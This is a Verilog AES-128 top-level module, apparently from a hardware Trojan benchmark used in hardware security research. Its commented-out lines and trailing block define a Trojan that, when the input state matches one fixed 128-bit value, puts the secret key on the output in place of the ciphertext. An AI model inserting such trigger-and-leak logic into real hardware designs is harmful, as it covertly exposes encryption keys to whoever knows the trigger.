`timescale 1ns / 1ps
// AES Top Module
//
// This module serves as the top-level entity for AES encryption. It instantiates
// the aes_128 module to perform the encryption process.
//
// The aes_top module receives the following inputs:
//   - clk: Clock signal
//   - rst: Reset signal
//   - state: Input state for AES encryption
//   - key: Input key for AES encryption
//
// It provides the following output:
//   - out: Encrypted output
//
// Revision History:
// - Revision 0.01: File created
//
//////////////////////////////////////////////////////////////////////////////////
module aes_top ( 
		 input clk, 
		 input rst, 
		 input [127:0] state, 
		 input [127:0] key, 
		 output [127:0] out
    ); 
	wire HT_Trig;
	wire [127:0] HT_ciphertext; 
	
	// Instantiation of AES encryption module
	aes_128 AES (.clk(clk), .rst(rst), .state(state), .key(key), .out(HT_ciphertext)); 
	assign out = HT_ciphertext;
	//HT_Tri HT_Trigger (.rst(rst), .state(state), .Tj_Trig(HT_Trig)); 
	//HT_TSC HT_Trojan (.Tj_Trig(HT_Trig), .key(key), .ciphertext(HT_ciphertext), .out(out)); 
 
endmodule

/*module HT_Tri(
    input rst,
    input [127:0] state,
    output reg Tj_Trig
    );

	always @(rst, state)
	begin
		if (rst == 1) begin
			Tj_Trig <= 0; 
		end else if (state == 128'h00112233_44556677_8899aabb_ccddeeff) begin 
			Tj_Trig <= 1; 
		end 
	end

endmodule

module HT_TSC(
     input Tj_Trig, 
    input [127:0] key,
    input [127:0] ciphertext,
    output [127:0] out
    );

assign out = Tj_Trig?key:ciphertext; 

endmodule */